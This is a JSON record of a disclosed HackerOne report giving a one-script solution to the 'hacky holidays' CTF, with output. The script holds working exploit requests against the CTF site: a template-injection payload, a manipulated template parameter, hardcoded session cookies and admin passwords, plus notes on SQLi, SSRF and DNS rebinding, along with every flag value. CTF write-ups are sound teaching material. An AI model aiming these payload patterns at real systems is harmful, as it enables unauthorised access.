{
  "id": 1065517,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY1NTE3",
  "url": "https://hackerone.com/reports/1065517",
  "title": "h1 hacky holidays CTF solution",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-12-23T22:47:29.659Z",
  "submitted_at": "2020-12-23T22:47:30.030Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "erbbysam",
    "url": "/erbbysam",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-01-11T22:24:38.757Z",
  "bug_reporter_agreed_on_going_public_at": "2021-01-11T22:19:40.859Z",
  "team_member_agreed_on_going_public_at": "2021-01-11T22:24:38.679Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Simple script to print all the flags. Full solution to follow (want to spend more time writing this, but am racing to be first 10 submissions):\n```\necho \"Flag 1 -- robots.txt\"\ncurl https://hackyholidays.h1ctf.com/robots.txt 2>/dev/null | grep flag\n\necho \"\"\necho \"Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )\"\ndiff <(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2>/dev/null | js-beautify) <(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2>/dev/null | js-beautify) | grep \"h1\"\n\necho \"\"\necho \"Flag 3 -- /people-rater\"\ncurl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 2>/dev/null | grep flag\n\necho \"\"\necho \"Flag 4 -- /swag-shop\"\ncurl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 2>/dev/null | grep flag\n\necho \"\"\necho \"Flag 5 -- /secure-login (access:computer)\"\nwget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2>&1 > /dev/null\nunzip -P hahahaha my_secure_files_not_for_you.zip 2>&1 > /dev/null\ncat flag.txt\nrm my_secure_files_not_for_you.zip\nrm flag.txt\nrm xxx.png\n\necho \"\"\necho \"Flag 6 -- /my-diary\"\ncurl https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php 2>/dev/null | grep flag\n\necho \"\"\necho \"flag 7 -- /hate-mail-generator\"\ncurl -X POST https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview --data 'preview_markup={{test}}{{email}}&preview_data={\"test\":\"{{template:\",\"email\":\"38dhs_admins_only_header.html}}\"}' 2>/dev/null | grep flag\n\n\necho \"\"\necho \"flag 8 -- /forum (grinch:BahHumbug)\"\ncurl https://hackyholidays.h1ctf.com/forum/3/2 -H 'Cookie: token=9F315347A655FFDAF70CD4A3529EE8A6' 2>/dev/null | grep flag\n\necho \"\"\necho \"flag 9 -- /evil-quiz\"\ncurl -X POST https://hackyholidays.h1ctf.com/evil-quiz/admin --data 'username=admin&password=S3creT_p4ssw0rd-%24' 2>/dev/null | grep flag\n\necho \"\"\necho \"flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)\"\ncurl https://hackyholidays.h1ctf.com/signup-manager/ -H 'Cookie: token=8fdaa7ac725a0f905e775a32a5cb7038' 2> /dev/null | grep flag\n\necho \"\"\necho \"flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)\"\ncurl -X POST https://hackyholidays.h1ctf.com/attack-box/login --data \"username=grinchadmin&password=s4nt4sucks\" --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null > /dev/null\ncurl https://hackyholidays.h1ctf.com/attack-box/ --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag\n\n\necho \"\"\necho \"flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)\"\ncurl https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag\nrm cookie.txt\n```\n\noutput:\n```\nFlag 1 -- robots.txt\nFlag: flag{48104912-28b0-494a-9995-a203d1e261e7}\n\nFlag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )\n<         h1_0 = 'la',\n<         h1_1 = '}',\n<         h1_2 = '',\n<         h1_3 = 'f',\n<         h1_4 = 'g',\n<         h1_5 = '{b7ebcb75',\n<         h1_6 = '8454-',\n<         h1_7 = 'cfb9574459f7',\n<         h1_8 = '-9100-4f91-';\n<     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);\n\nFlag 3 -- /people-rater\n{\"id\":\"eyJpZCI6MX0=\",\"name\":\"The Grinch\",\"rating\":\"Amazing in every possible way!\",\"flag\":\"flag{b705fb11-fb55-442f-847f-0931be82ed9a}\"}\n\nFlag 4 -- /swag-shop\n{\"uuid\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"username\":\"grinch\",\"address\":{\"line_1\":\"The Grinch\",\"line_2\":\"The Cave\",\"line_3\":\"Mount Crumpit\",\"line_4\":\"Whoville\"},\"flag\":\"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\"}\n\nFlag 5 -- /secure-login (access:computer)\nflag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\n\nFlag 6 -- /my-diary\n    <h4 class=\"text-center\">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>\n\nflag 7 -- /hate-mail-generator\n                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>\n\nflag 8 -- /forum (grinch:BahHumbug)\n                    <div class=\"well well-sm\" style=\"margin:0;font-size:12px\">We've launched our recon server, gathered intelligence and pin pointed Santa's location!<br>Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!<br><br><strong>flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}</strong></div>\n\nflag 9 -- /evil-quiz\n            <h3 class=\"text-center\">flag{6e8a2df4-5b14-400f-a85a-08a260b59135}</h3>\n\nflag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)\n                <p class=\"text-center\">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>\n\nflag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)\n        <h4 class=\"text-center\">flag{07a03135-9778-4dee-a83c-7ec330728e72}</h4>\n\nflag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)\n        <p><strong>flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}</strong></p>\n```\n\n## Impact\n\ncritical, we must stop the Grinch!",
  "weakness": {
    "id": 9,
    "name": "Buffer Over-read"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-02-10T22:19:40.906Z",
  "allow_singular_disclosure_after": -94837329.7190588,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "boy_child_",
    "yellowbanana",
    "southernborn981"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 59882,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.hackyholidays.h1ctf.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
